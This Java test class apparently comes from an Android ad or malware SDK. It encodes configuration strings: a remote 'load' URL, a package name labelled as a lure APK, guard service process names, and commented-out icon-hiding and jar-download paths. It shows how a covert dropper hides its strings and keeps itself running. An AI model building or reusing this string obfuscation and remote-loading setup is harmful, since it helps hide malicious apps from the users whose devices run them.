/**
 * Created by Administrator on 2014/11/7.
 */
public class Test {


    //    private static final String spfName = "ADS_";
//    public static final String assetsAppName = "ca";   //assets
//    public static final String assetsJarName = "cj";   //assets
    public static final String url = "http://192.168.1.107:9008/load";       //121.42.50.164
    //    private static final String spfSdkVersion = "sv_";
//    private static final String spfPackageName = "pn_";
//    private static final String spfMode = "m_";
//    private static final String spfAppState = "as_";
//    private static final String spfAppDownLoadState = "adls_";
//    private static final String spfJarDownLoadState = "jdls_";
//    private static final String spfJarState = "js_";
//    private static String spfServiceName = "sn_";

    public static String sdkVersion = "2.0.1";   //sdk版本
    public static String packageName = "com.x.dtswz";   //诱导Apk包名
    //    public static final String serviceClassPATH = "com.android.service.MainService";
//    public static final String HIDEICONAction = "com.hide.icon.action";
    public static String intentPackageName = "com.zsyjj.dtswz";      //com.zsyj.ttkp                              com.zsyj.duckabuse.xhy
    public static String serviceParentName = "com.x.dtswz.c";
    public static String guardServiceProcessName = "com.x.dtswz:d";
    public static String functionServiceProcessName = "com.x.dtswz:c";

//    public static final String serviceParentName2 = "com.as.sgqql.c";

//    public static final String str1 = "/Android/data/ad/";
//    public static final String str2 = "/jar/";
//    public static final String str3 = "/run/";

    public static void main(String[] args) {
//        System.out.println(EncrypUtil.encode(spfName));
//        System.out.println(EncrypUtil.encode(assetsAppName));
//        System.out.println(EncrypUtil.encode(assetsJarName));
        System.out.println(EncrypUtil.encode(url));
//        System.out.println(EncrypUtil.encode(spfSdkVersion));
//        System.out.println(EncrypUtil.encode(spfPackageName));
//        System.out.println(EncrypUtil.encode(spfMode));
//        System.out.println(EncrypUtil.encode(spfAppState));
//        System.out.println(EncrypUtil.encode(spfAppDownLoadState));
//        System.out.println(EncrypUtil.encode(spfJarDownLoadState));
//        System.out.println(EncrypUtil.encode(spfJarState));
//        System.out.println(EncrypUtil.encode(spfServiceName));

        System.out.println(EncrypUtil.encode(sdkVersion));
        System.out.println(EncrypUtil.encode(packageName));
//        System.out.println(EncrypUtil.encode(serviceClassPATH));
//        System.out.println(EncrypUtil.encode(HIDEICONAction));
        System.out.println(EncrypUtil.encode(intentPackageName));
//        System.out.println(EncrypUtil.encode(str1));
//        System.out.println(EncrypUtil.encode(str2));
//        System.out.println(EncrypUtil.encode(str3));
        System.out.println(EncrypUtil.encode(serviceParentName));
        System.out.println(EncrypUtil.encode(guardServiceProcessName));
        System.out.println(EncrypUtil.encode(functionServiceProcessName));
    }
}
